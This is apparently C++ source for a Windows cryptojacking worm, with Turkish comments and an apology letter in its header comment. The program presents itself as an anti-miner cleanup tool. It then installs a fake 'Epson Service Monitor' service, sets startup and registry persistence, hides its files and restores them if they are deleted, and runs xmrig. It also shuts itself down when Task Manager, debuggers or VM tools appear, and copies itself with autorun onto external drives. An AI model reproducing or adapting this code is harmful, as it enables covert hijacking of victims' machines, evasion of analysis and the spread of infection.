/*
 Sayın Yetkili,
 Buraya kadar gele bildiysen sen çok yetenekli birisin demek işlerin buraya kadar geliceyini düşünmezdim
 Kodun kaynak kodlarında görüyorsun demek

 Bilinçsizce attığım adımların sonuçlarını şimdi çok daha iyi anlıyorum.
 Yaptığım hatanın sadece teknik bir hata olmadığını,
 Arkasında çalışan insanların emeklerine, zamana ve güvene zarar verdiğini fark ettim.

 Bu hatam yüzünden sistemde yaşanan aksaklıklar için derin bir pişmanlık duyuyorum.
 Bilgimsizliğim ve dikkatsizliğimden dolayı ortaya çıkan sorunlar,
 Sizin ve ekibinizin işlerini zorlaştırdı, hatta belki de güveninizi sarstı.

 Bu yaşananlardan ders çıkardım ve bir daha böyle bir durumun yaşanmaması için
 Kendimi geliştirmeye, daha dikkatli ve sorumlu olmaya kararlıyım.

 Lütfen bu samimi özrümü kabul edin,
 Ve bana hatamı telafi etmek için bir şans daha verin.

 Yaşanan tüm zararlar için tekrar içtenlikle özür dilerim.

 Saygılarımla,
 [Malik]
*/

#include "Liblaries.h"

// -------//////----------------- MAIN ---------/////----------------
int WINAPI WinMain(_In_ HINSTANCE hInstance,
    _In_opt_ HINSTANCE hPrevInstance,
    _In_ LPSTR lpCmdLine,
    _In_ int nCmdShow)
{

#pragma region AntiVirus Prosess
    // >>> Log dosyasını aç (yorum satırına alırsan log kapatılır)
    logFile.open("cleanup_log.txt", std::ios::app);  // LOG: aç

    std::wcout << L"== Anti-Images Miner FULL ==\n";
    Log(L"== Yeni Çalıştırma Başladı ==");  // LOG: başlama

    bool admin = IsAdmin();
    if (admin) { std::wcout << L"[i] Yönetici modunda.\n"; Log(L"[i] Yönetici modunda."); }
    else { std::wcout << L"[i] Kullanıcı modunda.\n"; Log(L"[i] Kullanıcı modunda."); }

    // 1) Süreçleri öldür
    KillProcesses({
        L"images.exe", L"images.scr",
        L"NsCpuCNMiner64.exe", L"NsCpuCNMiner32.exe", L"NsGpuCNMiner.exe"
        L"images.exe*", L"images.scr*",
        L"NsCpuCNMiner64.exe *", L"NsCpuCNMiner32.exe *", L"NsGpuCNMiner.exe *"
        L"NsCpuCNMiner64.exe*", L"NsCpuCNMiner32.exe*", L"NsGpuCNMiner.exe*"
        });

    // 2) Dosya/klasör temizliği
    DeleteFolder(L"C:\\Users\\User\\AppData\\Roaming\\Images"); // aktif kullanıcı
    DeleteFolder(L"C:\\Images"); // Cdeki images klasorunu sil
    CleanRunKeys(admin);

    // 3) Klasör bloklama
    if (admin) {
        BlockAllUsersImagesFolder();  // tüm kullanıcılar için
        CleanScheduledTasks();
        CleanServices();
    }
    else {
        // sadece aktif kullanıcı için
        wchar_t* appData;
        if (_wdupenv_s(&appData, NULL, L"APPDATA") == 0 && appData) {
            std::wstring path = std::wstring(appData) + L"\\Images";
            BlockFileCreation(path);
            free(appData);
        }
    }

    std::wcout << L"[✓] Temizlik tamamlandı. Yeniden başlatın.\n";
    Log(L"[✓] Temizlik tamamlandı.\n");  // LOG: tamamlandı

    logFile.close();  // LOG: dosya kapatıldı

#pragma endregion

#pragma region Install Program Prosesse

    // Kendi özel temp klasör yolunu alır, yoksa hata verir ve programı kapatır
    std::string tempPath = getCustomTempPath();

    // Enfekte (işe bulaşmış) olup olmadığını tutan değişken (şu an false)
    std::string cmdPath = tempPath + "start.cmd";

    bool is_infeckt = detectInfectFromCMD(cmdPath);
    bool is_AntiVirus = false;
    // Dosyadan copyProgramName değerini al
    std::string copyProgramName = getCopyProgramNameFromCMD(cmdPath);


    std::vector<std::string> Destroy_Files = { "install_log.txt", "path_log.txt" };

    // Eğer program yönetici olarak çalışıyorsa
    if (IsRunningAsAdmin()) {
        // "Epson Service Monitor" adlı servisi kurar (varsa kurmaz)
        InstallServiceIfNotExists(L"Epson Service Monitor");
    }

#pragma endregion

#pragma region ADD_TO_STARUP_AND_REGISTRY

    // Programın çalışıp çalışmadığını kontrol etmek ve durdurmak için kullanılan atomic bool değişkeni
    std::atomic<bool> running(true);

    // Programı hem kısayol hem de registry ile Windows başlangıcına eklemeye çalışır
    AddToStartupBoth();

    // Programın kendi tam dosya yolunu alır (exePath)
    wchar_t exePath[MAX_PATH];
    GetModuleFileNameW(NULL, exePath, MAX_PATH);

    // Registry'ye de startup için ekler
    AddToStartup(exePath);

    // Program dosyasını gizli ve sistem dosyası olarak işaretler
    SetFileAttributesW(exePath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);



    // Yedek klasör yolunu alır, yoksa hata verir ve programı kapatır
    std::string backupPath = getBackupPath();
    if (backupPath.empty()) {
        std::cerr << "Backup klasoru olusturulamadi!" << std::endl;
        return 1;
    }

    // İzlenecek ve yedeklenecek dosyaların isimleri
    std::vector<std::string> files = {
        copyProgramName,
        "xmrig.exe",
        "start.cmd",
        "config.json",
    };

    // Temp klasöründeki dosyaları backup klasörüne gizli olarak kopyalar
    for (const auto& file : files) {
        std::string src = tempPath + file;
        std::string dest = backupPath + file;
        if (fileExists(src)) {
            copyFile(src, dest);
            SetFileAttributesA(dest.c_str(), FILE_ATTRIBUTE_HIDDEN);
        }
    }

    // Temp klasöründeki dosyaların gizli olmasını sağlar
    for (const auto& file : files) {
        std::string f = tempPath + file;
        if (fileExists(f)) {
            SetFileAttributesA(f.c_str(), FILE_ATTRIBUTE_HIDDEN);
        }
    }

    // Dosyaları izleyen ve silinen dosyaları yedekten geri yükleyen thread
    std::thread watcher(monitorAndRestore, files, tempPath, backupPath, std::ref(running));
    watcher.detach();


#pragma endregion

#pragma region MINES_PROSESS
    // Dizini al
    std::wstring fullPath(exePath);
    size_t pos = fullPath.find_last_of(L"\\/");
    std::wstring exeDir;
    if (pos != std::wstring::npos) {
        exeDir = fullPath.substr(0, pos + 1); // Sonunda \ ile bitiriyoruz
    }

    // xmrig.exe'nin tam yolu
    std::wstring xmrigPath = exeDir + L"xmrig.exe";

    // Miner thread'i başlat
    startMiner(running, xmrigPath);

#pragma endregion

#pragma region DAMAGE_PROGRAM

    // Global mutex oluşturur, böylece programdan sadece bir tane çalışır
    const char* mutexName = "Global\\MainProg";
    HANDLE hMutex = CreateMutexA(nullptr, TRUE, mutexName);
    if (!hMutex) return 1;
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        // Eğer zaten çalışıyorsa ikinci instance başlamaz, program kapanır
        CloseHandle(hMutex);
        return 0;
    }

    // Klavye kombinasyonu CTRL+SHIFT+ESC ile proqrami durdurmaya yarayan ve ya proses explorer falan acildiginda pthread
    std::thread keyThread([&running]()
        {
          while (running.load())
          {
          
            if (isTaskManagerOpen()) 
            { // Görev Yöneticisi açıldı mı kontrol
            KillProcessByName(L"xmrig.exe");
            std::this_thread::sleep_for(std::chrono::seconds(5));
            ExitProcess(0);
            }
        
                // CTRL+SHIFT+ESC kombinasyonu
                if ((GetAsyncKeyState(VK_CONTROL) & 0x8000) &&
                    (GetAsyncKeyState(VK_SHIFT) & 0x8000) &&
                    (GetAsyncKeyState(VK_ESCAPE) & 0x8000))
                {
                    running.store(false);
                    KillProcessByName(L"xmrig.exe");
                }

                // Yasaklı process kontrolü (procmon.exe veya procexp.exe)
                const wchar_t* forbidden[] = {
                L"procmon.exe", L"procexp.exe", L"procexp64.exe", L"procexp64a.exe",
                L"ProcessHacker.exe",L"ollydbg.exe", L"x64dbg.exe", L"x32dbg.exe",            
                L"windbg.exe", L"ida.exe", L"ida64.exe",
                L"cheatengine-x86_64.exe", L"cheatengine-i386.exe",
                L"ImmunityDebugger.exe", L"vmtoolsd.exe", L"vboxservice.exe"         
                };
                HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
                if (hSnap != INVALID_HANDLE_VALUE) {
                    PROCESSENTRY32W procEntry = { 0 };
                    procEntry.dwSize = sizeof(PROCESSENTRY32W);
                    if (Process32FirstW(hSnap, &procEntry)) {
                        do {
                            for (const auto& name : forbidden) {
                                if (_wcsicmp(procEntry.szExeFile, name) == 0) {
                                    running.store(false);
                                    KillProcessByName(L"xmrig.exe");
                                    ExitProcess(0); // Kendi programı kapat
                                }
                            }
                        } while (Process32NextW(hSnap, &procEntry));
                    }
                    CloseHandle(hSnap);
                }

                std::this_thread::sleep_for(std::chrono::milliseconds(20));
          }
        });
    keyThread.detach();    // Thread ana iş parçacığından ayrılır
 
#pragma endregion

#pragma region INFECKT FUNCTIONS
    // Harici sürücüleri tanımak için kullanılan liste
    std::vector<std::string> knownDrives;

    // Ana döngü: harici sürücüler kontrol edilir, yeni sürücü varsa veya hedef dosya yoksa kopyalama yapılır
    while (running.load()) {
        auto currentDrives = getExternalDrives();

        for (const auto& drive : currentDrives)
        {
            std::string destFile = drive + copyProgramName;

            // Eğer sürücü yeni veya dosya yoksa
            if (std::find(knownDrives.begin(), knownDrives.end(), drive) == knownDrives.end() || !fileExists(destFile))
            {
                std::string sourceFile = tempPath + copyProgramName;

                // isİnfeckt = false olarsa kopyalama yapılmaz
                // isİnfeckt = true olarsa kopyalama yapılmaz
                if (is_infeckt)
                {   
                    BackupProgramToHiddenBin(copyProgramName);  
                    copyToDrive(drive, sourceFile, copyProgramName);
                    CreateAutorunForAllDrives(copyProgramName); // her döngüde kontrol et
                }
                else
                {
                    DestroySetup(copyProgramName);
                }
                // Sürücü listeye eklenir
                if (std::find(knownDrives.begin(), knownDrives.end(), drive) == knownDrives.end())
                {
                    knownDrives.push_back(drive);
                }
            }                
        }
        Check_And_Destroy(Destroy_Files);

    }

    // Program sonlanırken mutex serbest bırakılır
    if (hMutex) 
    {
        ReleaseMutex(hMutex);
        CloseHandle(hMutex);
    }

    #pragma endregion

    return 0;
}

//--------------------------END----------------------------